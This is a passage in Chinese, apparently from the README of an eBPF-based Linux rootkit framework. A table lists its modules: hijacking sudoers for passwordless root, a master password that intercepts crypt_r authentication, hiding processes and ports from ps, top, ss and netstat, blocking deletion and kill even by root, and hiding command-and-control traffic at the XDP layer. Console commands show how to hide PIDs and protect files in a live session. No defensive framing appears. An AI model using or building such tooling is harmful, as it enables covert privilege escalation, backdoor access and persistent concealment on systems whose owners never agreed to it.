...
| 模块 | 功能 | Hook 机制 |
|---|---|---|
| **godmode** | 劫持 sudoers 读取流 → 赋予无密码 sudo 权限 | Tracepoint + `probe_write_user` |
| **golden_key** | 万能密码：拦截 `crypt_r()` 认证流 | uprobe / uretprobe |
| **shadow_walker** | 进程隐藏：从 `ps`、`top`、`/proc` 中消失 | Tracepoint (getdents64) |
| **netghost** | 端口隐藏：从 `ss`、`netstat` 中消失 | Tracepoint (proc/net/tcp) |
| **guard** | 文件/进程保护：即使 root 也无法 rm/mv/kill | LSM BPF |
| **stealth_link** | XDP 层 C2 通信隐身 + TCP RST 伪装 | XDP |
...
use shadow_walker
run
update <session_id> hidden_pids <要隐藏的PID>
```
...
use guard
run
update <session_id> protected_inodes <inode号>
```
